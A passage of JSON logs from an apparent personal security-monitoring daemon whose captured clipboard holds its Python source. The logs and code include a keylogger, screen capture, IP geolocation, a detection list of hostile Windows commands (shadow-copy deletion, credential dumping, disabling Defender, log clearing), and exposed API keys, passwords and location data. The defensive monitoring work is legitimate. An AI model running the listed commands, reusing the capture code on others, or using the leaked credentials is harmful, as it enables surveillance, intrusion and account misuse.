time.sleep(15)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "aa889bb83c2c09c46bf1b13566edc4fee71d5431d95df4292d3b828fcc57508b", "screenshot_hash": "c5d864ea891a1875e5084806d503d8c2243189210c242cee48cb350cf897128e", "_raw_log_hash": "234921fef3284ccb42a2e786ec6730f90ff277047113b50228a874d17a0c7263"}
{"timestamp": "2025-06-11T16:55:23.553056+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\nimport traceback # Added for detailed error logging\r\n\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\r\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\r\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\r\n\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",  # Formatting drives\r\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\r\n    \"net user\",  # User management (info or creation)\r\n    \"net localgroup administrators\",  # Admin group checks\r\n    \"taskkill /f /im\",  # Force kill process by image name\r\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\r\n    \"reg delete\",  # Delete registry keys\r\n    \"mimikatz\",  # Credential dumping tool\r\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",  # Download files via BITS\r\n    \"wevtutil cl system\",  # Clear event logs\r\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",  # Secure delete tool\r\n]\r\n\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())  # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())  # Still print even if file write fails\r\n\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use verify=False here as well, consistent with Elasticsearch client config\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                            verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a byte to force connection establishment, then close to prevent hanging\r\n    try:\r\n        response.raw.read(1)\r\n    except Exception as read_e:\r\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n    traceback.print_exc() # <-- Added traceback\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # This disables SSL certificate verification\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:  # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\",\r\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n            traceback.print_exc()\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n            traceback.print_exc()\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n            traceback.print_exc() # <-- Added traceback\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === New: Check Country Change Function ===\r\ndef check_country_change(current_country, alerts_list):\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\") as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\r\n        # Update the file for next session, even if it's the first run or country didn't change\r\n        with open(last_country_path, \"w\") as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\r\n    return alerts_list\r\n\r\n# === New: Check VPN/Proxy IP Function ===\r\ndef check_vpn_proxy_ip(current_ip, alerts_list):\r\n    \"\"\"\r\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\r\n    \"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\r\n    return alerts_list\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],  # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip = None\r\n        current_country = None\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\") # Store for country change check\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n            # NEW: Check for country change\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n\r\n            # NEW: Check for known VPN/proxy IP\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information)  # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(\r\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(\r\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        nonlocal keys  # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:  # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener:  # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    